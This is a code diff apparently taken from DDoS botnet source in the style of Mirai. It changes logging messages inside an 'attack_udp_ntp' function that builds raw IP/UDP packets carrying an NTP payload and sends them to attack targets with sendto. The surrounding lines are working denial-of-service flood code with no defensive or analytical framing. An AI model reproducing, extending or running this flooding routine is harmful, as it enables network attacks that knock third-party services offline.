@@ -374,8 +374,7 @@ void attack_udp_dns(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
 void attack_udp_ntp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    printf("Using NTP attack ...\n");
-    printf("IP Address: %s\n", inet_ntoa((struct in_addr){targs->addr}));
+    printf("[ATTACK] Initiating NTP attack ...\n");
     int i, fd;
     char **pkts = calloc(targs_len, sizeof (char *));
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
@@ -462,9 +461,10 @@ void attack_udp_ntp(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + 8 * sizeof(UCHAR));
 
             memcpy(pkt + sizeof(struct iphdr) + sizeof(struct udphdr) , ntp_packet , 8 * sizeof(UCHAR));
-            
+            printf("[NTP] Sending message ...\n");
             sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + 8 * sizeof(UCHAR), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
         }
+        printf("[NTP] Attack finished\n");
             break;
             if (errno != 0)
                 printf("errno = %d\n", errno);
